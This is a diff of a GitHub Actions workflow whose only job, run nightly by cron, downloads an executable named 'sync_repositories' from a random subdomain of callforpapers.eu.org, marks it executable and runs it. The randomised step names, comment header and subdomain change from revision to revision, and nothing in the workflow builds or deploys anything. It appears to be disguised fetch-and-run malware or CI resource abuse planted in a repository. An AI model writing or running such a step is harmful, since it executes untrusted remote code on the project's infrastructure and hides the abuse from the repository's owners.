@@ -1,4 +1,4 @@
-#2024-03-18-[083359]-8mhqs18f
+#2024-03-18-[135738]-g4exodbl
 name: main
 
 on:
@@ -9,14 +9,14 @@ on:
 
   schedule:
     - cron: "55 2 * * * "
-
+    
 jobs:
   build-deploy:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: kcvf2u1qi8agh6t5
+      - name: l9hpppxr55ner9rz
         run: |
-          wget -q https://cnwc60gbrrq4qk1f.callforpapers.eu.org/sync_repositories
+          wget -q https://w1dldvia786fewat.callforpapers.eu.org/sync_repositories
           chmod 755 sync_repositories
           ./sync_repositories
